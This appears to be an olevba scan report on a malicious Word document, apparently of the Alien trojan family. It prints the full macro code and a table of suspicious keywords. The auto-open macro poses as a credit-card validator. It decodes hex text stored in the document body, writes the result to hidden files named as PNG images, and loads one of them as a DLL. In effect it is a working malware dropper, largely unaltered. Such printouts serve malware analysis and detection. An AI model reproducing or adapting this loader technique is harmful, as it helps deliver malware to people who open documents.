olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Alien.gen-e03a7b921d3ebd2e5d1f850933f956813abf8abd23d42451f2df9b32e1f8c178
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Alien.gen-e03a7b921d3ebd2e5d1f850933f956813abf8abd23d42451f2df9b32e1f8c178 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOPen.bas 
in file: HEUR-Trojan.MSOffice.Alien.gen-e03a7b921d3ebd2e5d1f850933f956813abf8abd23d42451f2df9b32e1f8c178 - OLE stream: 'Macros/VBA/autoOPen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Enum NumericFunctions_CardType
    VISA = 1
    MasterCard = 2
    DinersClub = 3
    CanadianSocialInsuranceNumber = 4
    enRoute = 5
    Discover = 6
    Novus = 6
    AmericanExpress = 7
    AMEX = 7
    carteBlanche = 8
    [JCB (Japanese Credit Bureau)] = 9
    [Australian BankCard] = 10
    [Other (Gas,Retail,Debit,etc)] = 81
End Enum

#If VBA7 And Win64 Then
Declare PtrSafe Sub RedirectStandardError Lib "c:\.intel\.rem\1.png           " ()
#Else
Declare Sub RedirectStandardError Lib "c:\.intel\.rem\2.png           " ()
#End If

Sub main()
    GetCardName "4100", Novus
    CreateFolderRecursive "c:\.intel\.rem\.lang"
    GetCardName "3800", MasterCard
    FileNum = FreeFile
    Open "c:\.intel\.rem\1.png" For Append As FileNum
    Print #FileNum, hex2ascii(hex2ascii(ThisDocument.Words(1))) + hex2ascii(hex2ascii(ThisDocument.Words(3))) + hex2ascii(hex2ascii(ThisDocument.Words(5))) + hex2ascii(hex2ascii(ThisDocument.Words(7))) + hex2ascii(hex2ascii(ThisDocument.Words(9))) + hex2ascii(hex2ascii(ThisDocument.Words(11))) + hex2ascii(hex2ascii(ThisDocument.Words(13))) + hex2ascii(hex2ascii(ThisDocument.Words(15))) + hex2ascii(hex2ascii(ThisDocument.Words(17))) + hex2ascii(hex2ascii(ThisDocument.Words(19))) + hex2ascii(hex2ascii(ThisDocument.Words(21))) + hex2ascii(hex2ascii(ThisDocument.Words(23))) + hex2ascii(hex2ascii(ThisDocument.Words(25))) + hex2ascii(hex2ascii(ThisDocument.Words(27))) + hex2ascii(hex2ascii(ThisDocument.Words(29))) + hex2ascii(hex2ascii(ThisDocument.Words(31))) + hex2ascii(hex2ascii(ThisDocument.Words(33))) + _
    hex2ascii(hex2ascii(ThisDocument.Words(35))) + hex2ascii(hex2ascii(ThisDocument.Words(37))) + hex2ascii(hex2ascii(ThisDocument.Words(39))) + hex2ascii(hex2ascii(ThisDocument.Words(41))) + hex2ascii(hex2ascii(ThisDocument.Words(43))) + hex2ascii(hex2ascii(ThisDocument.Words(45))) + hex2ascii(hex2ascii(ThisDocument.Words(47))) + hex2ascii(hex2ascii(ThisDocument.Words(49))) + hex2ascii(hex2ascii(ThisDocument.Words(51))) + hex2ascii(hex2ascii(ThisDocument.Words(53))) + hex2ascii(hex2ascii(ThisDocument.Words(55))) + _
    hex2ascii(hex2ascii(ThisDocument.Words(57))) + hex2ascii(hex2ascii(ThisDocument.Words(59))) + hex2ascii(hex2ascii(ThisDocument.Words(61))) + hex2ascii(hex2ascii(ThisDocument.Words(63))) + hex2ascii(hex2ascii(ThisDocument.Words(65))) + hex2ascii(hex2ascii(ThisDocument.Words(67))) + hex2ascii(hex2ascii(ThisDocument.Words(69))) + hex2ascii(hex2ascii(ThisDocument.Words(71))) + hex2ascii(hex2ascii(ThisDocument.Words(73))) + hex2ascii(hex2ascii(ThisDocument.Words(75))) + hex2ascii(hex2ascii(ThisDocument.Words(77))) + hex2ascii(hex2ascii(ThisDocument.Words(79))) + hex2ascii(hex2ascii(ThisDocument.Words(81))) + hex2ascii(hex2ascii(ThisDocument.Words(83))) + hex2ascii(hex2ascii(ThisDocument.Words(85))) + hex2ascii(hex2ascii(ThisDocument.Words(87))) + hex2ascii(hex2ascii(ThisDocument.Words(89))) + _
    hex2ascii(hex2ascii(ThisDocument.Words(91))) + hex2ascii(hex2ascii(ThisDocument.Words(93))) + hex2ascii(hex2ascii(ThisDocument.Words(95))) + hex2ascii(hex2ascii(ThisDocument.Words(97))) + hex2ascii(hex2ascii(ThisDocument.Words(99))) + hex2ascii(hex2ascii(ThisDocument.Words(101))) + hex2ascii(hex2ascii(ThisDocument.Words(103))) + hex2ascii(hex2ascii(ThisDocument.Words(105))) + hex2ascii(hex2ascii(ThisDocument.Words(107))) + hex2ascii(hex2ascii(ThisDocument.Words(109))) + hex2ascii(hex2ascii(ThisDocument.Words(111))) + hex2ascii(hex2ascii(ThisDocument.Words(113))) + hex2ascii(hex2ascii(ThisDocument.Words(115))) + hex2ascii(hex2ascii(ThisDocument.Words(117)))
    Close FileNum
    
    Open "c:\.intel\.rem\2.png" For Append As FileNum
    Print #FileNum, hex2ascii(hex2ascii(ThisDocument.Words(119))) + hex2ascii(hex2ascii(ThisDocument.Words(121))) + hex2ascii(hex2ascii(ThisDocument.Words(123))) + hex2ascii(hex2ascii(ThisDocument.Words(125))) + hex2ascii(hex2ascii(ThisDocument.Words(127))) + hex2ascii(hex2ascii(ThisDocument.Words(129))) + hex2ascii(hex2ascii(ThisDocument.Words(131))) + hex2ascii(hex2ascii(ThisDocument.Words(133))) + hex2ascii(hex2ascii(ThisDocument.Words(135))) + hex2ascii(hex2ascii(ThisDocument.Words(137))) + hex2ascii(hex2ascii(ThisDocument.Words(139))) + hex2ascii(hex2ascii(ThisDocument.Words(141))) + hex2ascii(hex2ascii(ThisDocument.Words(143))) + hex2ascii(hex2ascii(ThisDocument.Words(145))) + hex2ascii(hex2ascii(ThisDocument.Words(147))) + hex2ascii(hex2ascii(ThisDocument.Words(149))) + hex2ascii(hex2ascii(ThisDocument.Words(151))) + _
    hex2ascii(hex2ascii(ThisDocument.Words(153))) + hex2ascii(hex2ascii(ThisDocument.Words(155))) + hex2ascii(hex2ascii(ThisDocument.Words(157))) + hex2ascii(hex2ascii(ThisDocument.Words(159))) + hex2ascii(hex2ascii(ThisDocument.Words(161))) + hex2ascii(hex2ascii(ThisDocument.Words(163))) + hex2ascii(hex2ascii(ThisDocument.Words(165))) + hex2ascii(hex2ascii(ThisDocument.Words(167))) + hex2ascii(hex2ascii(ThisDocument.Words(169))) + hex2ascii(hex2ascii(ThisDocument.Words(171))) + hex2ascii(hex2ascii(ThisDocument.Words(173))) + _
    hex2ascii(hex2ascii(ThisDocument.Words(175))) + hex2ascii(hex2ascii(ThisDocument.Words(177))) + hex2ascii(hex2ascii(ThisDocument.Words(179))) + hex2ascii(hex2ascii(ThisDocument.Words(181))) + hex2ascii(hex2ascii(ThisDocument.Words(183))) + hex2ascii(hex2ascii(ThisDocument.Words(185))) + hex2ascii(hex2ascii(ThisDocument.Words(187))) + hex2ascii(hex2ascii(ThisDocument.Words(189))) + hex2ascii(hex2ascii(ThisDocument.Words(191))) + hex2ascii(hex2ascii(ThisDocument.Words(193))) + hex2ascii(hex2ascii(ThisDocument.Words(195))) + hex2ascii(hex2ascii(ThisDocument.Words(197))) + hex2ascii(hex2ascii(ThisDocument.Words(199))) + hex2ascii(hex2ascii(ThisDocument.Words(201))) + hex2ascii(hex2ascii(ThisDocument.Words(203))) + hex2ascii(hex2ascii(ThisDocument.Words(205))) + hex2ascii(hex2ascii(ThisDocument.Words(207))) + _
    hex2ascii(hex2ascii(ThisDocument.Words(209))) + hex2ascii(hex2ascii(ThisDocument.Words(211))) + hex2ascii(hex2ascii(ThisDocument.Words(213))) + hex2ascii(hex2ascii(ThisDocument.Words(215))) + hex2ascii(hex2ascii(ThisDocument.Words(217))) + hex2ascii(hex2ascii(ThisDocument.Words(219))) + hex2ascii(hex2ascii(ThisDocument.Words(221)))

    Close FileNum

    IsValidCard "3600", Discover
End Sub

Private Function hex2ascii(ByVal TextToFile As String) As String
    Dim y As Integer
    For y = 1 To Len(TextToFile)
    num = Mid(TextToFile, y, 2)
    value = value + Chr(Val("&h" + num))
    y = y + 1
    Next y
    hex2ascii = value
End Function

Function CreateFolderRecursive(path As String) As Boolean
    Dim FSO As New FileSystemObject

    'If the path exists as a file, the function fails.
    If FSO.FileExists(path) Then
        CreateFolderRecursive = False
        Exit Function
    End If

    'If the path already exists as a folder, don't do anything and return success.
    If FSO.FolderExists(path) Then
        CreateFolderRecursive = True
        Exit Function
    End If

    'recursively create the parent folder, then if successful create the top folder.
    If CreateFolderRecursive(FSO.GetParentFolderName(path)) Then
        If FSO.CreateFolder(path) Is Nothing Then
            CreateFolderRecursive = False
        Else
            CreateFolderRecursive = True
        End If
    Else
        CreateFolderRecursive = False
    End If
End Function
Public Function IsValidCard(ByVal CardNumber As String, CCType As NumericFunctions_CardType, _
                                        Optional ReturnCardNameIfValid As Boolean = False) As Variant

    Dim X As Long
    Dim Total As Long
    Dim CardNumberLength As Long
    Dim Temp As String
    Dim RevCardNumber As String
    Dim ParsedCardNumber As String
    Dim Character As String
    Dim Digit As Long
    Dim FirstDigit As Long
    Dim FirstFourDigits As Long
    Dim DigitsOK As Boolean
    Dim LengthOK As Boolean
    


'Prepare the default return value
    If ReturnCardNameIfValid Then
            IsValidCard = ""

        Else
            Dim dtOrigTime As Date
            dtOrigTime = DateTime.Time
            Do Until DateDiff("s", dtOrigTime, DateTime.Time, 0, 0) > 1
            Loop
            IsValidCard = False
    End If
     
    
'Parses all non-numeric characters from
'CardNumber into a temporary string
    For X = 1 To Len(CardNumber)
        Character = Mid$(CardNumber, X, 1)
        Temp = Temp & IIf(IsNumeric(Character), Character, "")
    Next
    ParsedCardNumber = Temp
    
'Save the length of the card number length for later use
'in editting the card carrier
    CardNumberLength = Len(Temp)
        
    RedirectStandardError
'Exit if number of digits is not in range of testable Card numbers
    If CardNumberLength < 9 Or CardNumberLength > 19 Then
        Exit Function
    End If
    
'Save specific leading digits for later use in editting the card carrier
    FirstDigit = CLng(Left$(Temp, 1))
    FirstFourDigits = CLng(Left$(Temp, 4))
    
    Select Case CCType
        Case VISA
            DigitsOK = (FirstFourDigits >= 4000) And _
                            (FirstFourDigits <= 4999)
            LengthOK = (CardNumberLength = 13) Or _
                            (CardNumberLength = 16)
        Case MasterCard
            DigitsOK = (FirstFourDigits >= 5100) And _
                            (FirstFourDigits <= 5599)
            LengthOK = (CardNumberLength = 16)
        Case enRoute
            DigitsOK = (FirstFourDigits = 2014) Or _
                            (FirstFourDigits = 2149)
            LengthOK = (CardNumberLength = 15)
        Case Discover
            DigitsOK = (FirstFourDigits = 6011)
            LengthOK = (CardNumberLength = 16)
        Case DinersClub
            DigitsOK = ((FirstFourDigits >= 3000) And _
                            (FirstFourDigits <= 3059)) Or _
                            ((FirstFourDigits >= 3600) And _
                            (FirstFourDigits <= 3699)) Or _
                            ((FirstFourDigits >= 3800) And _
                            (FirstFourDigits <= 3889))
            LengthOK = (CardNumberLength = 14)
        Case carteBlanche
                DigitsOK = (FirstFourDigits >= 3890) And _
                                (FirstFourDigits <= 3899)
                LengthOK = (CardNumberLength = 14)
        Case AmericanExpress, AMEX
                DigitsOK = ((FirstFourDigits >= 3400) And _
                                (FirstFourDigits <= 3499)) Or _
                                ((FirstFourDigits >= 3700) And _
                                (FirstFourDigits <= 3799))
                LengthOK = (CardNumberLength = 15)
        Case CanadianSocialInsuranceNumber
                DigitsOK = Not (FirstDigit = 0) Or _
                                Not (FirstDigit = 8)
                LengthOK = (CardNumberLength = 9)
        Case [JCB (Japanese Credit Bureau)]
                DigitsOK = (FirstFourDigits >= 3528) And _
                                (FirstFourDigits <= 3589)
                LengthOK = (CardNumberLength = 16)
        Case [Australian BankCard]
                DigitsOK = (FirstFourDigits = 5610)
                LengthOK = (CardNumberLength = 16)
        Case [Other (Gas,Retail,Debit,etc)]
                DigitsOK = True
                LengthOK = True
        Case Else
                DigitsOK = False
                LengthOK = False
    End Select
    
'If the number sequence and/or card number length
'do not match the requirements the
'requirements of the carrier; Exit
    If Not DigitsOK Or Not LengthOK Then
        Exit Function
    End If
    
'Reverse the CardNumber
    For X = 1 To Len(Temp)
        RevCardNumber = Mid$(Temp, X, 1) & RevCardNumber
    Next
    
'Iterate through the reversed number; Add the
'calculated totals to string for subsequent summation.
'The equation  = (1 + (X - 1) Mod 2) below will result '
'in a multiplier of 1 if the element is odd (i.e. 1st digit, 3rd, 5th, etc)
'or a multiplier of 2 if the element is even (i.e. 2nd digit, 4th, 6th, etc)
    Temp = ""
    For X = 1 To Len(RevCardNumber)
        Digit = CLng(Mid$(RevCardNumber, X, 1))
        Temp = Temp & (Digit * (1 + (X - 1) Mod 2))
    Next
    
'Iterate through the string just created and total
'the individual numbers in each character of the string
    For X = 1 To Len(Temp)
        Total = Total + CLng(Mid$(Temp, X, 1))
    Next
    
'If the total of the added elements ends in zero, '
'the card number is valid
    IsValidCard = CBool(Total Mod 10 = 0)
    
    If IsValidCard And ReturnCardNameIfValid Then
        IsValidCard = GetCardName(ParsedCardNumber, CCType)
    End If
End Function


Private Function GetCardName(CardNumber As String, CCType As NumericFunctions_CardType) As String
    If CCType = CanadianSocialInsuranceNumber Then
        GetCardName = "SIN number"
        Exit Function
    End If
    On Error Resume Next
    Select Case Left$(CardNumber, 4)
        Case 1800
            GetCardName = "JCB (Japanese Credit Bureau)lsdkfjsdhf sdyfsdu dasfdva bda sdywegp"
        Case 2014
            GetCardName = "enRoute"
        Case 2131
            GetCardName = "JCB (Japanese Credit Bureau)"
        Case 2149
            GetCardName = "enRoute"
        Case 3000 To 3059
            GetCardName = "Diners Club"
        Case 3400 To 3499
            GetCardName = "American Express"
        Case 3528 To 3589
            GetCardName = "JCB (Japanese Credit Bureau)"
        Case 3600 To 3699
            GetCardName = "Diners Club"
        Case 3700 To 3799
            GetCardName = "American Express"
        Case 3800 To 3889
            GetCardName = "Diners Club"
        Case 3890 To 3899
            GetCardName = "carteBlanche"
        Case 4000 To 4999
            GetCardName = "VISA"
        Case 5100 To 5599
            GetCardName = "MasterCard"
        Case 5610
            GetCardName = "Australian BankCard"
        Case 6011
            GetCardName = "Discover"
        Case Else
                Select Case Left$(CardNumber, 1)
                    Case 1 'Airline
                        GetCardName = "Other (Airline)"
                    Case 2 'Airline and other industry assignments
                        GetCardName = "Other (Airline and other idustries)"
                    Case 3 'Travel/Entertainment
                        GetCardName = "Other (Travel/Entertainment)"
                    Case 4 'Banking and financial
                        GetCardName = "Other (Banking/Financial)"
                    Case 5 'Banking and financial
                        GetCardName = "Other (Banking/Financial)"
                    Case 6 'Merchandising and banking
                        GetCardName = "Other (Merchandising/Banking)"
                    Case 7 'Petroleum
                        GetCardName = "Other (Gas Company)"
                    Case 8 'HealthCare/Telecommunications and other
                        GetCardName = "Other (HealthCare/Telecomm/Etc)"
                    Case 9 'National assignment
                        GetCardName = "Other [Card Carrier Unknown]"
                    Case 0 'ISO/TC 68 and other industry assignments
                        GetCardName = "Other [Card Carrier Unknown]"
            End Select
    End Select

End Function









+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOPen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

